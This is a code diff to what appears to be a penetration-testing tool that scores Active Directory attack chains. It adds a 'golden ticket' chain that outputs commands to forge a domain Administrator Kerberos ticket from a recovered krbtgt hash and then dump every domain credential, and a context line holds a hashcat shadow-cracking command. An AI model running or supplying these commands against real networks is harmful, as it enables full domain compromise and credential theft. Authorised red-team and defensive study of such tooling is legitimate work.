@@ -178,6 +178,12 @@ def _entities(report, store):
             e.asreproastable.add(ev.user)
         # iter-23: ACL edges (BloodHound Aces[]) and cert templates
         # (certipy find / BloodHound CE certtemplates).
+        # iter-35: init krbtgt flag if not set (first evidence pass)
+        if not hasattr(e, "has_krbtgt"):
+            e.has_krbtgt = False
+            e.krbtgt_hash = ""
+            e.krbtgt_dom = ""
+            e.krbtgt_src = None
         if ev.kind == "acl_edge" and ev.fact:
             m = ev.meta or {}
             e.acl_edges.append({
@@ -188,6 +194,14 @@ def _entities(report, store):
                 "target_kind": m.get("target_kind", ""),
                 "src": ev.source, "line": ev.line,
             })
+        # iter-35: krbtgt NT hash -> golden ticket forgery. Highest-priority
+        # chain when present because it gives Administrator against ANY
+        # user in the domain, offline, no network.
+        if ev.kind == "krbtgt" and ev.hash:
+            e.has_krbtgt = True
+            e.krbtgt_hash = ev.hash
+            e.krbtgt_dom = ev.domain or ""
+            e.krbtgt_src = (ev.source, ev.line)
         if ev.kind == "cert_template":
             m = ev.meta or {}
             e.cert_templates.append({
@@ -575,6 +589,24 @@ def run(report, store, ui=None):
         chains.append(Chain("R21", "crack shadow", "Linux shadow hash present",
             crit=5, conf=0.8, ready=0.7, prox=0.6,
             commands=["unshadow passwd shadow > u; hashcat -m 1800 u rockyou.txt"], src=s, line=l))
+
+    # iter-35: R-GOLDEN - krbtgt NT hash was recovered (from NTDS DCSync or
+    # ntds.dit + SYSTEM). One command forges an Administrator TGT for the
+    # domain; no network re-auth needed. Highest-value chain when present.
+    if getattr(e, "has_krbtgt", False):
+        s_gt, l_gt = e.krbtgt_src or ("", None)
+        dom_gt = e.krbtgt_dom or "<DOM>"
+        chains.append(Chain("R-GOLDEN", "golden ticket",
+            f"krbtgt NT hash present -> forge Administrator TGT (score 15)",
+            crit=10, conf=1.0, ready=1.5, prox=1.0,         # score 15.0
+            commands=[
+                f"# Look up the domain SID from any user Evidence, then:",
+                f"impacket-ticketer -nthash {e.krbtgt_hash} "
+                f"-domain-sid <S-1-5-21-...> -domain {dom_gt} Administrator",
+                f"export KRB5CCNAME=Administrator.ccache",
+                f"impacket-secretsdump -k -no-pass '{dom_gt}/Administrator@<DC-FQDN>'   "
+                f"# every domain hash",
+            ], src=s_gt, line=l_gt))
 
     # iter-24: R-DPAPI - pair a recovered masterkey sha1 (pypykatz / impacket
     # output) with a Windows Credential vault file we've seen. With both,
